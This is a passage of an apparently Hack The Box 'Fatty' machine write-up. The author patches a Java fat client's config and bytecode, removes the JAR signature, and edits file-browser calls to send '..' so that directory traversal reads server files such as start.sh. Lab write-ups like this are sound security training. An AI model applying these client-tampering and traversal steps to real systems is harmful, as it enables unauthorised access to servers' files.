style="color:rgb(241, 250, 140)">index</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">1</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">ref</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">trustedFatty</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">constructor-arg</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">index</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">2</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">ref</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">secretHolder</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">beans</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s change the port value form <code>8080</code> to <code>1337</code> in <code>beans.xml</code> and then
update the jar archive. We also remove the files used for signature so Java
doesn&#x27;t complain <code>beans.xml</code> doesn&#x27;t match the signature anymore.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ jar -uf fatty-client-patched.jar beans.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ zip -d fatty-client-patched.jar META-INF/1.RSA META-INF/1.SF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">deleting: META-INF/1.SF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">deleting: META-INF/1.RSA</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we can run our patched version <code>java -jar fatty-client-patched.jar</code>.</p><p>But before, we need to add the local domain in our hosts file and to set Java 8.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep fatty</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.174 server.fatty.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ archlinux-java set java-8-openjdk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we can log in and discover the fat client from a user point of view.</p><p><img loading="lazy" src="https://i.imgur.com/bg9IPJr.png" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="client-discovery">Client discovery<a href="#client-discovery" class="hash-link" aria-label="Direct link to Client discovery" title="Direct link to Client discovery">​</a></h2><ul><li>Profile<ul><li>Whoami: ✅</li><li>ChangePassword: ❌</li></ul></li><li>ServerStatus<ul><li>Uname: ❌</li><li>Users: ❌</li><li>Netstat: ❌</li><li>Ipconfig: ❌</li></ul></li><li>FileBrowser: seems like a <code>ls</code> on a hardcoded folder<ul><li>Configs: ✅</li><li>Notes: ✅</li><li>Mail: ✅</li></ul></li><li>ConnectionTest:<ul><li>Ping: ✅</li></ul></li><li>Help<ul><li>Contact: ✅</li><li>About: ✅</li></ul></li></ul><p>There is also an <code>Open</code> feature that read a file (seems to exclude comments),
it seems it&#x27;s not possible to do directory traversal but we can <code>cd</code> in the
FileBrowser files and read them.</p><p><code>security.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Since our fatty clients processes sensitive data, we were forced to perform a penetration test on it.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I had no time to look at the results yet in more detail, but it looks like there are a few criticals.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">We should starting to fix these issues ASAP.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>dave.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hey qtc,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">until the issues from the current pentest are fixed we have removed all administrative users from the database.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Your user account is the only one that is left. Since you have only user permissions, this should prevent exploitation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">of the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">therefore no longer possible.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Best regards,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dave</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="code-analysis-fatty-client">Code analysis: fatty client<a href="#code-analysis-fatty-client" class="hash-link" aria-label="Direct link to Code analysis: fatty client" title="Direct link to Code analysis: fatty client">​</a></h2><p>With <a href="https://java-decompiler.github.io/" target="_blank" rel="noopener noreferrer">JD-GUI</a> or other decompiler we can decompile the code to read it.
With <code>jar -uf</code> we can easily update a text file like <code>beans.xml</code> but we can&#x27;t
update code in the JAR because the code is compiled (<code>.class</code>).
Trying to compile our <code>.java</code> won&#x27;t probably do any good as there are not
the original code but ones obtained through decompilation.
So the best idea is to update the original JAR via a Java bytecode editor.</p><p>I used <a href="https://github.com/Col-E/Recaf" target="_blank" rel="noopener noreferrer">Recaf</a> for that.</p><p><code>htb/fatty/client/gui/ClientGuiTest.java</code></p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">        openFileButton.addActionListener(new ActionListener(){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                if (ClientGuiTest.this.currentFolder == null) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;No folder selected! List a directory first!&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    return;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                String response = &quot;&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                String fileName = ClientGuiTest.this.fileTextField.getText();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                fileName.replaceAll(&quot;[^a-zA-Z0-9.]&quot;, &quot;&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    response = ClientGuiTest.this.invoker.open(ClientGuiTest.this.currentFolder, fileName);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                catch (MessageBuildException | MessageParseException e1) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;Failure during message building/parsing.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                catch (IOException e2) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;Unable to contact the server. If this problem remains, please close and reopen the client.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                textPane.setText(response);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        });</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">        openFileButton.addActionListener(new ActionListener(){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                String response = &quot;&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                String fileName = ClientGuiTest.this.fileTextField.getText();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    response = ClientGuiTest.this.invoker.open(&quot;..&quot;, fileName);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                catch (MessageBuildException | MessageParseException e1) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;Failure during message building/parsing.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                catch (IOException e2) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;Unable to contact the server. If this problem remains, please close and reopen the client.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                textPane.setText(response);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        });</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But still <code>/opt/fatty/files</code> prefix. Putting <code>/</code> in foldername is filtered server-side
too.</p><p><img loading="lazy" src="https://i.imgur.com/H8s7Hyw.png" class="img_ev3q"></p><p>Too see what&#x27;s in that folder let&#x27;s modify the function that list files in one
folder, from:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">configs.addActionListener(new ActionListener()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        String response = &quot;&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ClientGuiTest.this.currentFolder = &quot;configs&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          response = ClientGuiTest.this.invoker.showFiles(&quot;configs&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          JOptionPane.showMessageDialog(controlPanel, &quot;Failure during message building/parsing.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        catch (IOException e2) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          JOptionPane.showMessageDialog(controlPanel, &quot;Unable to contact the server. If this problem remains, please close and reopen the client.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>to:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">configs.addActionListener(new ActionListener()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        String response = &quot;&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ClientGuiTest.this.currentFolder = &quot;..&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          response = ClientGuiTest.this.invoker.showFiles(&quot;..&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          JOptionPane.showMessageDialog(controlPanel, &quot;Failure during message building/parsing.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        catch (IOException e2) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          JOptionPane.showMessageDialog(controlPanel, &quot;Unable to contact the server. If this problem remains, please close and reopen the client.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So by going to <code>FileBrowser -&gt; Configs</code> we can list what is in <code>/opt/fatty/</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">logs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">start.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fatty-server.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">files</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We now have the name of the server JAR: <code>fatty-server.jar</code>.</p><p><code> /opt/fatty/start.sh</code></p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token shebang important">#!/bin/sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Unfortunately alpine docker containers seems to have problems with services.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># I tried both, ssh and cron to start via openrc, but non of them worked. Therefore,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># both services are now started as part of the docker startup script.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start cron service</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">crond -b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start ssh server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/sbin/sshd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start Java application server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">su</span><span class="token plain"> - qtc /bin/sh -c </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;java -jar /opt/fatty/fatty-server.jar&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The server seems to be run as <code>qtc</code> so we won&#x27;t elevate our privilege directly.</p><p>By doing the same with <code>logs</code> and <code>tar</code> we can see what&#x27;s inside:</p><p><code>/opt/fatty/logs/</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">error-log.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info-log.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>/opt/fatty/tar/</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">logs.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" 